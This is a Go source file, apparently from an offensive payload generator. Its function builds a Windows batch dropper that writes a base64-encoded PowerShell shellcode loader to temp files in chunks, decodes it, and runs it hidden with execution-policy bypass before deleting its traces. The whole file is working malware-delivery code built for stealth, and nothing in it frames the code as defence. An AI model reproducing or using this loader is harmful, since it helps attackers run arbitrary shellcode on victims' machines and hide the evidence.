package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// buildBatScript wraps raw shellcode bytes into a .bat file.
// The PS1 loader is base64-encoded so that no CMD-special characters
// (parentheses, brackets, quotes, etc.) appear in the echo'd lines.
// Flow: echo base64 chunks → .b64 temp file → PowerShell decodes to .ps1 → execute → cleanup.
func buildBatScript(shellcode []byte) []byte {
	// Re-use the PS1 builder so both formats stay in sync.
	psScript := buildPowerShellScript(shellcode)
	psB64 := base64.StdEncoding.EncodeToString(psScript)

	// Base64 characters (A-Z a-z 0-9 + / =) are all safe for CMD echo.
	const chunkSize = 7500
	var sb strings.Builder

	sb.WriteString("@echo off\r\n")
	sb.WriteString("setlocal\r\n")
	sb.WriteString("set \"_b=%TEMP%\\%RANDOM%.b64\"\r\n")
	sb.WriteString("set \"_f=%TEMP%\\%RANDOM%.ps1\"\r\n")

	for i := 0; i < len(psB64); i += chunkSize {
		end := i + chunkSize
		if end > len(psB64) {
			end = len(psB64)
		}
		if i == 0 {
			sb.WriteString(fmt.Sprintf("echo %s>\"%%_b%%\"\r\n", psB64[i:end]))
		} else {
			sb.WriteString(fmt.Sprintf("echo %s>>\"%%_b%%\"\r\n", psB64[i:end]))
		}
	}

	// Decode the base64 file to a PS1 file, then execute it.
	sb.WriteString("powershell -NoP -NonI -W Hidden -Command \"$b=([IO.File]::ReadAllText('%_b%')-replace'\\s','');[IO.File]::WriteAllBytes('%_f%',[Convert]::FromBase64String($b))\"\r\n")
	sb.WriteString("del \"%_b%\"\r\n")
	sb.WriteString("powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File \"%_f%\"\r\n")
	sb.WriteString("del \"%_f%\"\r\n")

	return []byte(sb.String())
}
